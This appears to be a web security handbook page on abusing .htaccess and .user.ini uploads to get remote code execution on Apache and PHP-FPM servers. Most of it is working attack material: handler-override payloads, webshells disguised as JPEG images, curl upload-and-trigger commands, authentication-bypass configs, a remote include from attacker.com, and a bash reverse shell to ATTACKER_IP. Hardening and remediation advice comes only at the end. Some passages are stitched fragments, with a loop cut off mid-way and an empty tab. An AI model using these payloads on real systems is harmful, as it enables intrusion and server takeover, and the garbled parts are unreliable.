::note
`.htaccess` (Hypertext Access) is a distributed configuration file used by the Apache HTTP Server to apply per-directory configuration overrides without modifying the main server config. When an application allows uploading `.htaccess` files — or fails to block them — an attacker can **redefine how the server processes files in that directory**. This enables executing arbitrary code from otherwise harmless file extensions (`.jpg`, `.txt`, `.png`), disabling security controls, enabling directory listing, bypassing authentication, and redirecting traffic. Combined with a second file upload (a webshell disguised as an image), this two-stage attack produces reliable Remote Code Execution even against applications with strict upload validation.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="How .htaccess Override Works"}
  1. Apache processes requests by checking for `.htaccess` files in every directory from the document root down to the requested file's directory
  2. Each `.htaccess` found is parsed and its directives are applied, **overriding** the main server configuration
  3. The `AllowOverride` directive in the main config controls **which directives** `.htaccess` can use
  4. When `AllowOverride All` is set (common in shared hosting and many deployments), `.htaccess` can change virtually everything
  5. An attacker uploads a `.htaccess` file to the upload directory
  6. Apache reads and applies it immediately — **no restart needed**
  7. Subsequent requests to that directory follow the attacker's configuration
  8. The attacker then requests a previously uploaded webshell (e.g., `shell.jpg`) — Apache now processes it as PHP due to the `.htaccess` override

  **Key insight:** `.htaccess` changes take effect **instantly** — there is no cache or delay. The moment the file is written, Apache uses it for the next request.
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Prerequisites for Exploitation"}
  | Prerequisite | Details | How to Check |
  | ------------ | ------- | ------------ |
  | **Apache HTTP Server** | Nginx, IIS, Caddy, LiteSpeed do NOT use `.htaccess` (LiteSpeed partially does) | `curl -sI target | grep Server` |
  | **AllowOverride enabled** | Must be `All`, `FileInfo`, `Options`, or at minimum allow the needed directives | Upload `.htaccess`, check if directives apply |
  | **mod_php or PHP-FPM** | PHP must be available as a handler | Check `X-Powered-By` header or error pages |
  | **File upload capability** | Must be able to write `.htaccess` to a web-accessible directory | Test upload endpoint |
  | **Filename control** | Upload must preserve the `.htaccess` filename exactly | Test if server renames uploads |
  | **Directory access** | The upload directory must be web-accessible | Browse to upload directory |
  :::

  :::accordion-item{icon="i-lucide-target" label="Attack Categories"}
  | Attack | .htaccess Directive | Impact |
  | ------ | ------------------- | ------ |
  | **PHP Execution from Images** | `AddType application/x-httpd-php .jpg` | RCE via image file |
  | **PHP Execution from Any File** | `SetHandler application/x-httpd-php` | RCE via any file |
  | **PHP Code in .htaccess** | `php_value auto_prepend_file .htaccess` | Direct RCE from .htaccess |
  | **Server-Side Includes** | `Options +Includes` + `AddHandler server-parsed .html` | Code execution via SSI |
  | **CGI Execution** | `Options +ExecCGI` + `AddHandler cgi-script .py` | RCE via script upload |
  | **Directory Listing** | `Options +Indexes` | Information disclosure |
  | **Authentication Bypass** | `Satisfy Any` / `Require all granted` | Access control bypass |
  | **Custom Error Pages** | `ErrorDocument 404 /shell.php` | Redirect to webshell |
  | **URL Rewriting** | `RewriteRule` | Request smuggling, SSRF |
  | **Credential Theft** | `php_value auto_prepend_file` | Intercept all requests |
  | **CORS Override** | `Header set Access-Control-Allow-Origin "*"` | Cross-origin data theft |
  | **Security Header Removal** | `Header unset X-Frame-Options` | Clickjacking enablement |
  | **Proxy Abuse** | `RewriteRule .* http://attacker.com` | SSRF / traffic hijack |
  :::

## Malicious .htaccess Payloads

::warning
Each `.htaccess` payload serves a specific purpose. The most reliable attack is a two-stage approach: upload `.htaccess` to change handlers, then upload a webshell with an allowed extension.
::

### PHP Execution Payloads

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="AddType / AddHandler"}
  ```bash
  # ═══════════════════════════════════════
  # TECHNIQUE 1: AddType — Map extensions to PHP MIME type
  # ═══════════════════════════════════════

  # Make .jpg files execute as PHP
  cat > .htaccess << 'EOF'
  AddType application/x-httpd-php .jpg
  EOF

  # Make multiple image extensions execute as PHP
  cat > .htaccess << 'EOF'
  AddType application/x-httpd-php .jpg .jpeg .png .gif .bmp .ico .txt .html .xml .svg .webp .pdf
  EOF

  # Make ALL files execute as PHP (nuclear option)
  cat > .htaccess << 'EOF'
  AddType application/x-httpd-php .htaccess
  ForceType application/x-httpd-php
  EOF

  # ═══════════════════════════════════════
  # TECHNIQUE 2: AddHandler — Associate handler with extensions
  # ═══════════════════════════════════════

  cat > .htaccess << 'EOF'
  AddHandler application/x-httpd-php .jpg .png .gif .txt
  EOF

  # PHP7 specific handler
  cat > .htaccess << 'EOF'
  AddHandler application/x-httpd-php7 .jpg
  EOF

  # PHP-FPM handler
  cat > .htaccess << 'EOF'
  AddHandler "proxy:unix:/run/php/php-fpm.sock|fcgi://localhost" .jpg
  EOF

  # PHP8 handler
  cat > .htaccess << 'EOF'
  AddHandler application/x-httpd-php80 .jpg
  AddHandler application/x-httpd-php81 .jpg
  AddHandler application/x-httpd-php82 .jpg
  AddHandler application/x-httpd-php83 .jpg
  EOF

  # ═══════════════════════════════════════
  # TECHNIQUE 3: SetHandler — Force handler for ALL files
  # ═══════════════════════════════════════

  cat > .htaccess << 'EOF'
  SetHandler application/x-httpd-php
  EOF
  # Every file in directory is now treated as PHP

  # With FilesMatch for specific patterns
  cat > .htaccess << 'EOF'
  <FilesMatch "\.jpg$">
      SetHandler application/x-httpd-php
  </FilesMatch>
  EOF

  # Case-insensitive match
  cat > .htaccess << 'EOF'
  <FilesMatch "\.(?i)(jpg|jpeg|png|gif|bmp|ico|txt|pdf|svg)$">
      SetHandler application/x-httpd-php
  </FilesMatch>
  EOF

  # Match ANY file
  cat > .htaccess << 'EOF'
  <FilesMatch ".*">
      SetHandler application/x-httpd-php
  </FilesMatch>
  EOF

  # ═══════════════════════════════════════
  # TECHNIQUE 4: ForceType — Override MIME type detection
  # ═══════════════════════════════════════

  cat > .htaccess << 'EOF'
  ForceType application/x-httpd-php
  EOF

  # ═══════════════════════════════════════
  # TECHNIQUE 5: Multiple handler fallbacks
  # ═══════════════════════════════════════
  # Try multiple handler names (different PHP versions/configs)

  cat > .htaccess << 'EOF'
  # Try each — one will match the installed PHP handler
  AddHandler application/x-httpd-php .jpg
  AddHandler application/x-httpd-php5 .jpg
  AddHandler application/x-httpd-php7 .jpg
  AddHandler application/x-httpd-php8 .jpg
  AddHandler application/x-httpd-php74 .jpg
  AddHandler application/x-httpd-php80 .jpg
  AddHandler application/x-httpd-php81 .jpg
  AddHandler application/x-httpd-php82 .jpg
  AddHandler application/x-httpd-php83 .jpg
  AddHandler php-script .jpg
  AddHandler php5-script .jpg
  AddHandler php7-script .jpg
  AddHandler php-cgi .jpg
  AddHandler fcgid-script .jpg
  EOF
  ```

  :::tabs-item{icon="i-lucide-file-code" label="auto_prepend_file (Direct RCE)"}
  ```bash
  # ═══════════════════════════════════════
  # TECHNIQUE 6: php_value auto_prepend_file
  # Execute PHP code DIRECTLY from .htaccess without second file upload!
  # ═══════════════════════════════════════

  # Method A: .htaccess includes itself as PHP prepend
  # The .htaccess file contains PHP code after the directives
  # PHP ignores lines that aren't inside <?php ?> tags

  cat > .htaccess << 'HTEOF'
  php_value auto_prepend_file .htaccess
  #<?php system($_GET['cmd']); ?>
  HTEOF

  # Method B: Prepend a previously uploaded file
  cat > .htaccess << 'EOF'
  php_value auto_prepend_file "shell.jpg"
  EOF
  # Now ANY .php file request in this directory will first include shell.jpg

  # Method C: auto_append_file (executes AFTER the main script)
  cat > .htaccess << 'EOF'
  php_value auto_append_file .htaccess
  #<?php system($_GET['cmd']); ?>
  EOF

  # Method D: Prepend with full path
  cat > .htaccess << 'EOF'
  php_value auto_prepend_file "/var/www/html/uploads/shell.jpg"
  EOF

  # Method E: Prepend /etc/passwd (file read PoC)
  cat > .htaccess << 'EOF'
  php_value auto_prepend_file /etc/passwd
  EOF

  # Method F: Combined — self-executing .htaccess
  # This is the MOST POWERFUL single-file RCE
  cat > .htaccess << 'HTEOF'
  php_value auto_prepend_file .htaccess
  #<?php
  # if(isset($_GET['cmd'])) {
  #   echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
  # }
  # if(isset($_GET['phpinfo'])) {
  #   phpinfo();
  # }
  #?>
  HTEOF

  # After uploading, ANY .php request in the directory triggers the code:
  # curl "https://target.com/uploads/anything.php?cmd=id"
  # If no .php file exists in uploads, create a dummy:
  # echo "<?php ?>" > dummy.php and upload it

  # Method G: Include remote file (if allow_url_include is On)
  cat > .htaccess << 'EOF'
  php_value auto_prepend_file "http://attacker.com/shell.txt"
  php_value allow_url_include 1
  EOF
  ```

### Security Bypass Payloads

::tabs
  :::tabs-item{icon="i-lucide-lock-open" label="Authentication Bypass"}
  ```bash
  # ═══════════════════════════════════════
  # Authentication & Authorization Bypass
  # ═══════════════════════════════════════

  # Remove all access restrictions
  cat > .htaccess << 'EOF'
  # Apache 2.2
  Order allow,deny
  Allow from all
  Satisfy Any

  # Apache 2.4
  Require all granted
  EOF

  # Override existing authentication
  cat > .htaccess << 'EOF'
  <IfModule mod_authz_core.c>
      Require all granted
  </IfModule>
  <IfModule !mod_authz_core.c>
      Order allow,deny
      Allow from all
      Satisfy Any
  </IfModule>
  EOF

  # Bypass IP-based restrictions
  cat > .htaccess << 'EOF'
  # Remove IP restrictions
  <IfModule mod_authz_core.c>
      Require all granted
  </IfModule>
  <IfModule !mod_authz_core.c>
      Order deny,allow
      Allow from all
  </IfModule>
  EOF

  # Override .htpasswd protection
  cat > .htaccess << 'EOF'
  # Disable password protection for this directory
  AuthType None
  Require all granted
  Satisfy Any
  EOF
  ```

## Two-Stage Attack Workflow

::tip
The most reliable .htaccess exploitation follows a two-stage pattern: first upload `.htaccess` to change handlers, then upload a webshell with an allowed extension. If `.htaccess` supports `auto_prepend_file`, single-stage RCE is possible.
::

### Stage-by-Stage Exploitation

::steps{level="4"}

#### Stage 1 — Upload malicious .htaccess

```bash
# Create .htaccess that makes .jpg files execute as PHP
echo 'AddType application/x-httpd-php .jpg .png .gif .txt' > .htaccess

# Upload .htaccess
curl -X POST "https://target.com/api/upload" \
  -F "file=@.htaccess;filename=.htaccess;type=text/plain" \
  -H "Cookie: session=TOKEN" -v

# Verify .htaccess is active (should cause 500 for invalid directives or change behavior)
curl -s -o /dev/null -w "%{http_code}" "https://target.com/uploads/"
```

#### Stage 2 — Upload webshell with allowed extension

```bash
# Create PHP webshell as .jpg
echo '<?php echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; ?>' > shell.jpg

# Upload — passes extension validation (.jpg is allowed)
curl -X POST "https://target.com/api/upload" \
  -F "file=@shell.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"

# For magic byte validation bypass, prepend JPEG header
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -X POST "https://target.com/api/upload" \
  -F "file=@shell.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"
```

#### Stage 3 — Trigger code execution

```bash
# Access the webshell — Apache now processes .jpg as PHP
curl -s "https://target.com/uploads/shell.jpg?cmd=id"
curl -s "https://target.com/uploads/shell.jpg?cmd=whoami"
curl -s "https://target.com/uploads/shell.jpg?cmd=uname+-a"
curl -s "https://target.com/uploads/shell.jpg?cmd=cat+/etc/passwd"
```

#### Stage 4 — Escalate to reverse shell

```bash
# Start listener on attacker machine
nc -lvnp 4444

# Trigger reverse shell via webshell
curl -s "https://target.com/uploads/shell.jpg" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

  ```bash
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: ${config}"
  done

  # ── PHP-FPM alternative: .user.ini ──
  # .user.ini works with PHP-FPM (FastCGI) and is checked per-directory

  echo 'auto_prepend_file=shell.jpg' > /tmp/user_ini
  for name in ".user.ini" ".User.ini" ".USER.INI" ".user.INI"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/user_ini;filename=${name}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] .user.ini ACCEPTED: ${name}"
  done

  rm -f /tmp/alt_config /tmp/user_ini
  ```

## .user.ini — PHP-FPM Alternative

::note
When the target uses **PHP-FPM** (FastCGI) instead of mod_php, or when the server is **Nginx**, `.htaccess` has no effect. However, **`.user.ini`** files work with PHP-FPM and are processed per-directory, providing a similar attack vector.
::

::tabs
  :::tabs-item{icon="i-lucide-file-cog" label=".user.ini Exploitation"}
  ```bash
  # ═══════════════════════════════════════
  # .user.ini — PHP-FPM per-directory config
  # Works with: Nginx+PHP-FPM, Apache+PHP-FPM
  # Does NOT work with: mod_php (use .htaccess instead)
  # ═══════════════════════════════════════

  # IMPORTANT: .user.ini has a cache TTL (default 300 seconds / 5 minutes)
  # Changes take effect after user_ini.cache_ttl expires
  # Check: php -i | grep user_ini.cache_ttl

  # ── auto_prepend_file — Include shell before every request ──
  echo 'auto_prepend_file=shell.jpg' > .user.ini

  # Upload .user.ini
  curl -X POST "https://target.com/api/upload" \
    -F "file=@.user.ini;filename=.user.ini;type=text/plain" \
    -H "Cookie: session=TOKEN"

  # Upload webshell as .jpg
  printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -X POST "https://target.com/api/upload" \
    -F "file=@shell.jpg;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  # Wait for cache to expire (up to 5 minutes by default)
  echo "[*] Waiting for .user.ini cache to expire..."
  sleep 10

  # Access ANY .php file in the upload directory
  # PHP-FPM auto-includes shell.jpg before processing
  curl -s "https://target.com/uploads/index.php?cmd=id"
  curl -s "https://target.com/uploads/any_file.php?cmd=id"

  # If no .php file exists in uploads, upload one
  echo '<?php echo "dummy"; ?>' > dummy.php
  curl -X POST "https://target.com/api/upload" \
    -F "file=@dummy.php;filename=dummy.php" \
    -H "Cookie: session=TOKEN"

  curl -s "https://target.com/uploads/dummy.php?cmd=id"

  # ── auto_append_file — Include after every request ──
  echo 'auto_append_file=shell.jpg' > .user.ini

  # ── Self-referencing .user.ini with PHP ──
  cat > .user.ini << 'USERINI'
  auto_prepend_file=.user.ini
  ;<?php system($_GET['cmd']); die(); ?>
  USERINI

  # ── Change error settings ──
  cat > .user.ini << 'EOF'
  display_errors=On
  error_reporting=E_ALL
  log_errors=On
  error_log=/var/www/html/uploads/php_errors.log
  EOF

  # ── Enable URL inclusion ──
  cat > .user.ini << 'EOF'
  auto_prepend_file=shell.jpg
  allow_url_include=On
  allow_url_fopen=On
  EOF

  # ── Session manipulation ──
  cat > .user.ini << 'EOF'
  session.save_path=/var/www/html/uploads/sessions
  session.serialize_handler=php_serialize
  session.auto_start=1
  EOF
  ```
  :::

  :::tabs-item{icon="i-lucide-file-cog" label=".user.ini vs .htaccess Comparison"}

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: .htaccess → AddType → Image Shell → RCE
  ---
  1. Upload `.htaccess` with `AddType application/x-httpd-php .jpg`
  2. Upload `shell.jpg` containing `<?php system($_GET["cmd"]); ?>`
  3. Access `https://target.com/uploads/shell.jpg?cmd=id`
  4. Apache processes `.jpg` as PHP → full RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: .htaccess → auto_prepend → Self-Exec → RCE
  ---
  1. Upload `.htaccess` with `php_value auto_prepend_file .htaccess` and PHP code in comments
  2. Access any `.php` file in the directory
  3. PHP auto-includes `.htaccess`, executes embedded code
  4. Single-file RCE without needing a second upload
  :::

  :::card
  ---
  icon: i-lucide-link
  title: .htaccess → CGI Handler → Python/Perl Shell → RCE
  ---
  1. Upload `.htaccess` with `Options +ExecCGI` and `AddHandler cgi-script .py`
  2. Upload `shell.py` with CGI webshell code
  3. Access `https://target.com/uploads/shell.py?cmd=id`
  4. Apache executes Python script as CGI
  :::

  :::card
  ---
  icon: i-lucide-link
  title: .htaccess → SSI → Command Execution
  ---
  1. Upload `.htaccess` with `Options +Includes` and SSI handler
  2. Upload `shell.shtml` with `<!--#exec cmd="id"-->`
  3. Access the file → Apache processes SSI directives
  4. Command output rendered in response
  :::

  :::card
  ---
  icon: i-lucide-link
  title: .htaccess → Auth Bypass → Admin Panel
  ---
  1. Upload `.htaccess` with `Satisfy Any` and `Require all granted`
  2. Access previously restricted `/admin/` directory
  3. Authentication requirements overridden
  4. Full admin panel access without credentials
  :::

  :::card
  ---
  icon: i-lucide-link
  title: .user.ini → auto_prepend → LFI Chain → RCE
  ---
  1. Upload `.user.ini` with `auto_prepend_file=shell.gif`
  2. Upload `shell.gif` with PHP code
  3. Upload or find any `.php` file in same directory
  4. Access `.php` file → PHP auto-includes shell.gif → RCE
  :::

## Detection & Prevention

### Source Code Review

::code-group
```bash [Grep for Vulnerable Code]
# ── Search for upload code that doesn't block .htaccess ──

# PHP — check if .htaccess is in blocked list
grep -rnP "(blocked|blacklist|denied|forbidden).*\.(htaccess|htpasswd|user\.ini)" --include="*.php" .
grep -rnP "pathinfo|PATHINFO_EXTENSION|getExtension" --include="*.php" . | head -20

# Check if upload code has dotfile protection
grep -rnP "^\." --include="*.php" . | grep -i "upload\|file\|name"

# Python
grep -rnP "(blocked|blacklist|FORBIDDEN).*htaccess" --include="*.py" .
grep -rnP "startswith\s*\(\s*['\"]\.'" --include="*.py" .

# Node.js
grep -rnP "(blocked|blacklist|forbidden).*htaccess" --include="*.js" .
grep -rnP "startsWith\s*\(\s*['\"]\.'" --include="*.js" .

# Check Apache config for AllowOverride
grep -rn "AllowOverride" /etc/apache2/ /etc/httpd/ 2>/dev/null
grep -rn "AccessFileName" /etc/apache2/ /etc/httpd/ 2>/dev/null
```

```bash [Apache Hardening Check]
# ── Verify Apache configuration hardening ──

# Check AllowOverride settings
apache2ctl -S 2>/dev/null | head -20
httpd -S 2>/dev/null | head -20

# Find AllowOverride directives
grep -rn "AllowOverride" /etc/apache2/ /etc/httpd/ /usr/local/apache2/ 2>/dev/null

# Check for dangerous AllowOverride All
grep -rn "AllowOverride All" /etc/apache2/ /etc/httpd/ 2>/dev/null
# This should be restricted to "AllowOverride None" for upload directories

# Check upload directory config
grep -A5 "uploads\|media\|files\|static" /etc/apache2/sites-enabled/* 2>/dev/null

# Verify PHP handler configuration
grep -rn "application/x-httpd-php\|php_module\|SetHandler" /etc/apache2/ 2>/dev/null

# Check if .htaccess is disabled for upload directories
cat /etc/apache2/sites-enabled/000-default.conf 2>/dev/null | grep -A10 "uploads"
```

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Block .htaccess Upload
  ---
  Explicitly reject any filename starting with `.ht` — reject `.htaccess`, `.htpasswd`, `.htdigest`, and all case variations. Also block `.user.ini`. Use case-insensitive matching: `if (strtolower(filename).startsWith('.ht')) reject()`.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable AllowOverride
  ---
  Set `AllowOverride None` for upload directories in Apache configuration. This completely disables `.htaccess` processing for those directories regardless of what files exist there.

  ```apache
  <Directory /var/www/html/uploads>
      AllowOverride None
      Options -Indexes -ExecCGI -Includes
  </Directory>
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable PHP in Upload Directory
  ---
  Configure Apache to never execute PHP in the upload directory, regardless of any `.htaccess` override attempt.

  ```apache
  <Directory /var/www/html/uploads>
      php_flag engine off
      RemoveHandler .php .phtml .php5
      <FilesMatch "\.ph(p|tml|p5|p7|ar)$">
          Deny from all
      </FilesMatch>
  </Directory>
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Generate Random Filenames
  ---
  Never preserve original upload filenames. Generate random names server-side: `$name = bin2hex(random_bytes(16)) . '.jpg'`. This prevents `.htaccess` from being written since the filename is randomized.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Block Dotfiles Entirely
  ---
  Reject any upload where the filename starts with a dot (`.`). Dotfiles are configuration files on Unix systems and should never be uploaded by users.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Store Outside Web Root
  ---
  Save uploaded files outside the document root and serve them through a proxy script. This prevents any uploaded file from being directly accessed or executed by the web server.
  :::
::
